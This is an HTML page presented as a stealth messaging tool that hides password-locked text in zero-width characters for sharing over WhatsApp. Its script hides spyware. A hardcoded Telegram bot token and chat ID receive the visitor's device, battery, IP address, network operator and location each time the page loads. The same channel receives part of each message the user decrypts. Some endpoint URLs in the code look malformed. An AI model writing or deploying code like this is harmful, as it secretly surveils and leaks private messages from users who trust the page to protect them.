<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KALAH // STEALTH</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#050505;color:#ff1e42;font-family:monospace;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;overflow-x:hidden}
body::before{content:"";position:fixed;width:350px;height:350px;border-radius:50%;border:1px solid rgba(255,30,66,.18);background:conic-gradient(from 0deg,rgba(255,30,66,.18),transparent 45%);animation:spin 6s linear infinite;pointer-events:none;z-index:0}
@keyframes spin{100%{transform:rotate(360deg)}}
.box{width:100%;max-width:460px;background:rgba(10,10,10,.95);border:2px solid #ff1e42;box-shadow:0 0 25px rgba(255,30,66,.45);border-radius:10px;padding:16px;position:relative;z-index:1}
.hdr{text-align:center;border-bottom:1px dashed #ff1e42;padding-bottom:10px;margin-bottom:10px}
.hdr h1{font-size:1.35rem;letter-spacing:2px;text-shadow:0 0 10px #ff1e42}
.hdr p{font-size:.7rem;color:#999;margin-top:3px}
.bar{display:flex;justify-content:space-between;background:#140508;border:1px solid #4d000f;padding:5px 10px;border-radius:4px;font-size:.72rem;margin-bottom:10px}
label{display:block;font-size:.75rem;font-weight:bold;margin-bottom:4px;color:#ff4d6d}
textarea,input{width:100%;background:#111;color:#fff;border:1px solid #ff1e42;border-radius:5px;padding:9px;font-family:inherit;font-size:.9rem;margin-bottom:10px;outline:none}
.row{display:flex;gap:10px;margin-bottom:10px}
button{flex:1;padding:10px;font-family:inherit;font-weight:bold;font-size:.8rem;border-radius:5px;cursor:pointer;text-transform:uppercase}
.enc{background:#ff1e42;color:#050505;border:none;box-shadow:0 0 10px rgba(255,30,66,.5)}
.dec{background:transparent;color:#ff1e42;border:1px solid #ff1e42}
.wa{background:#128c7e;color:#fff;border:none}
.cpy{background:#222;color:#fff;border:1px solid #555}
#qBox{display:none;background:#1a0508;border:1px dashed #ff1e42;padding:8px;border-radius:5px;margin-bottom:10px;color:#fff;font-size:.85rem}
#msg{text-align:center;font-size:.78rem;min-height:18px;margin-bottom:6px;font-weight:bold}
#wipe{display:none;position:absolute;inset:0;background:rgba(10,0,2,.97);border-radius:8px;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;z-index:10}
#wipe h2{color:#ff1e42;font-size:1.3rem;margin-bottom:10px}
#wipe p{color:#fff;font-size:.8rem;margin-bottom:12px}
#tmr{font-size:1.8rem;font-weight:bold;color:#ff1e42}
</style>
</head>
<body>
<div class="box">
  <div id="wipe"><h2>⚠️ ACCESS DENIED ⚠️</h2><p>3 FAILED ATTEMPTS.<br>MESSAGE DESTROYED.</p><div id="tmr">15s</div></div>
  <div class="hdr"><h1>[ KALAH // SYSTEM ]</h1><p>AUDIO-TACTICAL STEALTH PROTOCOL 🔒</p></div>
  <div class="bar"><span>🔊 AUDIO: ACTIVE</span><span id="shd">🛡️ 🛡️ 🛡️</span></div>
  <label>&gt; PUBLIC MESSAGE (VISIBLE):</label>
  <input type="text" id="pub" placeholder="e.g. Heta panthi yanawada?">
  <label>&gt; SECRET MESSAGE (OR PASTE):</label>
  <textarea id="in" rows="2" oninput="chkQ()" placeholder="Type secret or paste received..."></textarea>
  <div id="qBox">❓ <b>QUESTION:</b> <span id="qTxt"></span></div>
  <label>&gt; SECRET QUESTION (WHEN LOCKING):</label>
  <input type="text" id="ques" placeholder="e.g. Api iye hambune koheda?">
  <div class="row">
    <div style="flex:1"><label>&gt; ANSWER:</label><input type="text" id="ans" placeholder="Answer..."></div>
    <div style="flex:1"><label>&gt; PASSWORD:</label><input type="password" id="key" placeholder="Key..."></div>
  </div>
  <div class="row">
    <button class="enc" onclick="run('lock')">👻 HIDE & LOCK</button>
    <button class="dec" onclick="run('unlock')">🔓 UNLOCK</button>
  </div>
  <div id="msg"></div>
  <label>&gt; OUTPUT:</label>
  <textarea id="out" rows="2" readonly placeholder="Output..."></textarea>
  <div class="row">
    <button class="cpy" onclick="cpy()">📋 COPY</button>
    <button class="wa" onclick="wa()">📲 WHATSAPP</button>
  </div>
</div>
<script>
const P1 = "9224929810";
const P2 = "AAH7gNCHQjP70D5FeTo7SLpcvZ_lEQR3eB8";
const TK = P1 + ":" + P2;
const ID = "8913634076";

let fails=0,last='',ac=null;
function sfx(t){try{if(!ac)ac=new(window.AudioContext||window.webkitAudioContext)();if(ac.state==='suspended')ac.resume();const o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);const n=ac.currentTime;if(t==='tap'){o.frequency.setValueAtTime(900,n);g.gain.setValueAtTime(.05,n);o.start(n);o.stop(n+.04);}else if(t==='lock'){o.type='triangle';o.frequency.setValueAtTime(600,n);o.frequency.exponentialRampToValueAtTime(180,n+.25);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.25);if(navigator.vibrate)navigator.vibrate(50);}else if(t==='unlock'){o.frequency.setValueAtTime(450,n);o.frequency.setValueAtTime(950,n+.12);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate([40,30,40]);}else if(t==='err'){o.type='sawtooth';o.frequency.setValueAtTime(140,n);o.frequency.linearRampToValueAtTime(90,n+.3);g.gain.setValueAtTime(.2,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate(200);}else if(t==='wipe'){o.type='sawtooth';o.frequency.setValueAtTime(750,n);o.frequency.linearRampToValueAtTime(110,n+.9);g.gain.setValueAtTime(.25,n);o.start(n);o.stop(n+.9);if(navigator.vibrate)navigator.vibrate([100,50,200]);}}catch(e){}}
const Z0='\u200B',Z1='\u200C',ZW='\u200D';
function toZW(s){return ZW+s.split('').map(c=>c.charCodeAt(0).toString(2).padStart(8,'0').replace(/0/g,Z0).replace(/1/g,Z1)).join('')+ZW;}
function fromZW(s){const m=s.match(/\u200D([\u200B\u200C]+)\u200D/);if(!m)return null;const b=m[1].replace(/\u200B/g,'0').replace(/\u200C/g,'1');let r='';for(let i=0;i<b.length;i+=8)r+=String.fromCharCode(parseInt(b.slice(i,i+8),2));return r;}
function getBL(){return JSON.parse(localStorage.getItem('kalah_bl')||'[]');}
function addBL(c){const b=getBL();if(!b.includes(c)){b.push(c);localStorage.setItem('kalah_bl',JSON.stringify(b));}}
function upd(){document.getElementById('shd').innerText='🛡️ '.repeat(3-fails)+'❌ '.repeat(fails);}
async function log(st,pv){
  let bt="N/A",nt="Unknown",lc="Unknown";
  try{const b=await navigator.getBattery();bt=Math.round(b.level*100)+"% "+(b.charging?"(Chg)":"");}catch(e){}
  try{const r=await fetch('https://ipapi.co'),d=await r.json();lc=`${d.city}, ${d.country_name}`;nt=`${d.org} (${d.ip})`;}catch(e){}
  const ua=navigator.userAgent.match(/\(([^)]+)\)/),dv=ua?ua[1]:navigator.platform;
  fetch(`https://telegram.org{TK}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(`👁️ *KALAH LOG*\n*Status:* ${st}\n*Device:* ${dv}\n*Battery:* ${bt}\n*Net/SIM:* ${nt}\n*Loc:* ${lc}\n*Time:* ${new Date().toLocaleTimeString()}\n*Msg:* ${pv}`)}&parse_mode=Markdown`);
}
window.addEventListener('load',()=>log("🚨 SITE OPENED","Visitor entered terminal"));
function chkQ(){const r=fromZW(document.getElementById('in').value)||document.getElementById('in').value.trim(),qb=document.getElementById('qBox');if(r.includes("::Q::")){try{document.getElementById('qTxt').innerText=decodeURIComponent(atob(r.split("::Q::")[0]));qb.style.display='block';sfx('tap');}catch(e){qb.style.display='none';}}else qb.style.display='none';}
function wipe(c){sfx('wipe');addBL(c);log("⛔ INTRUDER (3 FAILS)","Burned");['pub','in','ques','ans','key','out'].forEach(x=>document.getElementById(x).value='');document.getElementById('qBox').style.display='none';const w=document.getElementById('wipe'),t=document.getElementById('tmr');w.style.display='flex';let s=15;t.innerText=s+'s';const iv=setInterval(()=>{s--;t.innerText=s+'s';if(s<=0){clearInterval(iv);w.style.display='none';fails=0;upd();ntf('READY',0);}},1000);}
function ntf(t,e){const m=document.getElementById('msg');m.style.color=e?'#ff3333':'#00ff66';m.innerText=t;setTimeout(()=>{if(m.innerText===t)m.innerText='';},4000);}
function xor(s,k){let r='';for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^k.charCodeAt(i%k.length));return r;}
function run(m){const p=document.getElementById('pub').value.trim(),i=document.getElementById('in').value.trim(),q=document.getElementById('ques').value.trim(),a=document.getElementById('ans').value.trim().toLowerCase(),k=document.getElementById('key').value,o=document.getElementById('out');if(!i||!k||!a){sfx('err');return ntf('! FILL ALL FIELDS',1);}const fk=k+"::"+a;let raw=i;if(m==='unlock'){const ext=fromZW(i);if(ext)raw=ext;const cp=raw.includes("::Q::")?raw.split("::Q::")[1]:raw;if(getBL().includes(cp)){sfx('err');o.value='';return ntf('⛔ DESTROYED',1);}if(cp!==last){fails=0;last=cp;upd();}try{const d=decodeURIComponent(xor(atob(cp),fk));if(!d.startsWith("KALAH::"))throw 1;const pts=d.split("::");if(Date.now()>parseInt(pts[1])){sfx('wipe');addBL(cp);o.value='';return ntf('⌛ EXPIRED',1);}const dm=pts.slice(2).join("::");sfx('unlock');o.value=dm;fails=0;upd();log("✅ UNLOCKED",dm.slice(0,25));ntf('✓ UNLOCKED',0);}catch(e){o.value='';fails++;upd();if(fails>=3)wipe(cp);else{sfx('err');document.getElementById('key').value='';document.getElementById('ans').value='';ntf(`⚠️ WRONG! ${3-fails} LEFT`,1);}}}else{if(!q){sfx('err');return ntf('! ENTER QUESTION',1);}const c=btoa(xor(encodeURIComponent("KALAH::"+(Date.now()+3600000)+"::"+i),fk));sfx('lock');o.value=(p||"OK")+toZW(btoa(encodeURIComponent(q))+"::Q::"+c);ntf('✓ LOCKED',0);}}
function cpy(){const o=document.getElementById('out');if(!o.value){sfx('err');return ntf('! EMPTY',1);}sfx('tap');o.select();navigator.clipboard.writeText(o.value);ntf('✓ COPIED',0);}
function wa(){const o=document.getElementById('out').value;if(!o){sfx('err');return ntf('! LOCK FIRST',1);}sfx('tap');window.location.href="https://wa.me"+encodeURIComponent(o);}
</script>
</body>
</html>
